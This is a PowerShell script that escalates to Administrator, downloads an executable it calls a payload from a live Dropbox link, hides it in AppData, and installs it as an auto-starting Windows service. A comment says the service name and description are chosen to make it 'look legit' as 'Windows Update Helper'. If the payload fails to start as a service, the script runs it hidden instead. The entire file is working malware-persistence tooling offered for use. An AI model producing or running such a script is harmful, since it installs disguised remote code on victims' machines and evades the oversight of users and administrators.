<#
.SYNOPSIS
    Downloads a payload and installs it as a persistent Windows Service.
    Run this script as Administrator.

.DESCRIPTION
    1. Checks for Administrator privileges.
    2. Downloads an executable from a specified URL.
    3. Saves it to a secure location (e.g., AppData or Temp).
    4. Creates a Windows Service to run the executable automatically at startup.
    5. Starts the service and the executable immediately.

.NOTES
    File Name: install_service.ps1
    Author: Antigravity
#>

# --- CONFIGURATION (EDIT THESE) ---
$DownloadUrl = "https://www.dropbox.com/scl/fi/8sd2wb7b6kjak2riqm7ze/wmchost.exe?rlkey=q9o1dkt2dmtiob1afp0gu3m4g&st=bd0sspjh&dl=1"   # REPLACE THIS with your direct download link
$ServiceName = "WindowsUpdateHelper"                 # Name of the service (Make it look legit)
$DisplayName = "Windows Update Helper Service"       # Display name in Services.msc
$Description = "Keeps your Windows system up to date." # Description for the service
$FileName    = "servies.exe"                         # Name of the executable file on disk
$DestPath    = "$env:APPDATA\$FileName"              # Save location (Hidden in AppData)

# --- SCRIPT START ---
Write-Host "[*] Starting Persistence Script..." -ForegroundColor Cyan

# 1. Check for Admin Privileges
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "[-] Script is not running as Administrator. Requesting elevation..."
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}
Write-Host "[+] Running as Administrator." -ForegroundColor Green

# 2. Download the Executable
Write-Host "[*] Downloading payload from $DownloadUrl..." -ForegroundColor Cyan
try {
    # Create web client to download
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile($DownloadUrl, $DestPath)
    
    if (Test-Path $DestPath) {
        Write-Host "[+] File downloaded successfully to: $DestPath" -ForegroundColor Green
    } else {
        throw "Download failed. File not found at destination."
    }
}
catch {
    Write-Error "[-] Failed to download file: $_"
    # Fallback to Invoke-WebRequest if WebClient fails
    try {
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestPath -ErrorAction Stop
        Write-Host "[+] File downloaded (Fallback) to: $DestPath" -ForegroundColor Green
    } catch {
        Write-Error "[-] Critical: Could not download payload. Check URL."
        Exit
    }
}

# 3. Create or Update the Windows Service
Write-Host "[*] Creating Service: $ServiceName..." -ForegroundColor Cyan

# Check if service exists
$Service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue

if ($Service) {
    Write-Host "[!] Service already exists. Stopping and re-configuring..." -ForegroundColor Yellow
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    # Validating path (sc.exe is often more reliable for modification than Set-Service for binpath)
    sc.exe config $ServiceName binPath= "$DestPath" start= auto
    Write-Host "[+] Service re-configured." -ForegroundColor Green
} else {
    # Create new service
    # Note: Regular EXEs might timeout without a service wrapper, but they will still launch.
    New-Service -Name $ServiceName `
                -BinaryPathName $DestPath `
                -DisplayName $DisplayName `
                -Description $Description `
                -StartupType Automatic `
                -ErrorAction Stop
    Write-Host "[+] Service created successfully." -ForegroundColor Green
}

# 4. Start the Service / Execute
Write-Host "[*] Starting payload..." -ForegroundColor Cyan

# Attempt to start the service
try {
    Start-Service -Name $ServiceName -ErrorAction Stop
    Write-Host "[+] Service started." -ForegroundColor Green
} catch {
    Write-Warning "[!] Service execution triggered (Note: Regular EXEs may not report 'Started' status to Windows, but process should be running)."
    # If the service fails to report "Started" (common for non-service EXEs), force start as process too just in case
    Start-Process -FilePath $DestPath -WindowStyle Hidden
    Write-Host "[+] Payload executed manually as fallback." -ForegroundColor Green
}

Write-Host "`n[SUCCESS] Persistence established! Service '$ServiceName' will auto-start on boot." -ForegroundColor Green
Write-Host "Path: $DestPath"
